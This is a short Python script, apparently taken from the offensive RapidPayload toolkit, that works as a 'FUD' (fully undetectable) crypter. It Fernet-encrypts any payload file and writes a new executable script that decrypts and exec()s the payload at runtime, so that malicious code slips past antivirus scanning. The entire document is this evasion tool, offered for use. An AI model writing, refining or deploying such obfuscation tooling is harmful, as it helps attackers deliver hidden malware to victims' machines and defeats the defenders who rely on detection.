#!/usr/local/bin/python
#https://github.com/AngelSecurityTeam/RapidPayload
# python .py_fud payload.py
from cryptography.fernet import Fernet
import os,sys,random
with open(sys.argv[1], 'r+') as f:
   contents = f.read()
key = Fernet.generate_key()
f = Fernet(key)
enc_payload = f.encrypt(contents)
f1 = open("date"+".txt", "a+")
f1.write(enc_payload)
f1.close()
final_payload = open("FUD_python_RapidPayload"+".py", "w+")
final_payload.write("""
from cryptography.fernet import Fernet
import os
import sys
key = """ + "\'"+key+"\'")
final_payload.write("""
f_obj= Fernet(key)
enc_pay =""" "\'"+enc_payload+"\'")
final_payload.write("""
exec(f_obj.decrypt(enc_pay))
    """)
final_payload.close()
os.system("rm date.txt")
os.system("chmod +x FUD_python_RapidPayload.py")
